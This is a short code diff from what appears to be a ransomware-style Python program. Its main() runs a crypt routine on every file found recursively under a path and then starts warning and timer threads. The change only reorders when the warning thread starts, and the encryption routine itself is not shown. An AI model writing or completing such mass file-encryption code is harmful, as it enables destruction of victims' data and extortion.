@@ -60,8 +60,8 @@ def main():
     for file in my_path.glob("**/*.*"):
         crypt(file)
     warnthread = threading.Thread(target=warn)
-    warnthread.start()
     timerthread = threading.Thread(target=timer)
+    warnthread.start()
     timerthread.start()
 
 main()
